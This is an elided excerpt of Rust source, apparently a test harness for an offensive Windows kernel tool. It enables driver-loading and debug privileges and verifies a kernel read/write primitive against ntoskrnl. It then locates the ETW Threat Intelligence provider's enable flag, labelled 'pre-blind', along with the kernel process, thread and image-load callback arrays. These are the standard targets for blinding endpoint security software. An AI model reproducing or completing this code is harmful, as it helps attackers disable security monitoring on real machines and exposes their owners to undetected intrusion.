...
fn enable_privileges() {
    for (luid, name) in [(10u32, "SeLoadDriverPrivilege"), (20u32, "SeDebugPrivilege")] {
        let mut prev: i32 = 0;
        ...
        if status == 0 {
            ...
            eprintln!("[priv] {} RtlAdjustPrivilege -> NTSTATUS 0x{:x}", name, status as u32);
        }
    }
}
...
fn main() {
    println!("[bootstrap_test] start (pid={}, integrity check via whoami /groups)",
             std::process::id());
    ...
    println!("[H.3] kread ntoskrnl PE header ({} bytes) for sanity ...", 0x400);
    ...
    if !(hdr[0] == b'M' && hdr[1] == b'Z') {
        eprintln!("[FAIL] ntoskrnl @0x{:016x} is not MZ — base wrong or read failed", base);
        loaded.unload();
        std::process::exit(4);
    }
    ...
    println!("[OK] MZ + PE sig verified (e_lfanew=0x{:x}) — KernelRw read works", e_lfanew);
        ...
        Ok(guid_entry_ptr) => {
            ...
            if guid_entry_ptr == 0 {
                ...
                match krw.kread_u64(guid_entry_ptr as usize + off.guid_entry_to_provider_block) {
                    Ok(prov_block) => {
                        println!("[OK] GUIDEntry+0x{:x} → provider_block = 0x{:016x}",
                        ...
                        if prov_block != 0 {
                            ...
                            match krw.kread_u64(is_enabled_kva) {
                                Ok(v) => println!("[OK] IsEnabled @0x{:016x} = 0x{:x} (1=enabled/pre-blind)",
                                                  is_enabled_kva, v),
    ...
    if let Some(nt_rva) = resolve_kernel_symbol(&image, b"NtCreateFile") {
        println!("[OK] export-resolver sanity: NtCreateFile RVA = 0x{:x}", nt_rva);
    } else {
    ...
    for (name, r) in [
        ("EtwThreatIntProvRegHandle", rva::ETW_THREAT_INT_PROV_REG_HANDLE),
        ("PspCreateProcessNotifyRoutine", rva::PSP_CREATE_PROCESS_NOTIFY_ROUTINE),
        ("PspCreateThreadNotifyRoutine", rva::PSP_CREATE_THREAD_NOTIFY_ROUTINE),
        ("PspLoadImageNotifyRoutine", rva::PSP_LOAD_IMAGE_NOTIFY_ROUTINE),
        ("PsActiveProcessHead", rva::PS_ACTIVE_PROCESS_HEAD),
    ] {
        println!("       {:<32} RVA=0x{:08X} KVA=0x{:016x}", name, r, base + r as usize);
    }
